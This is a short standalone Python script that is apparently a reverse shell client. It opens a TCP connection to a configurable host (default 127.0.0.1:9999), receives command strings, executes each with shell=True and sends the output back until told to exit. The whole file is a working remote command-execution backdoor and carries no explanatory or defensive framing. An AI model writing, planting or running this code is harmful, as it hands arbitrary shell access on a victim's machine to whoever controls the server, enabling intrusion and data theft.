import socket
import subprocess

def connect_to_server(host="127.0.0.1", port=9999):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    print("[CONNECTED] Connected to the server.")
    
    try:
        while True:
            command = client.recv(4096).decode()
            if command.lower() == 'exit':
                print("[INFO] Server requested to close the connection.")
                break
            
            # Execute the command and capture the output
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output  # Capture output of failed command

            client.send(output.encode())
    except Exception as e:
        print(f"[ERROR] Connection lost: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    connect_to_server()
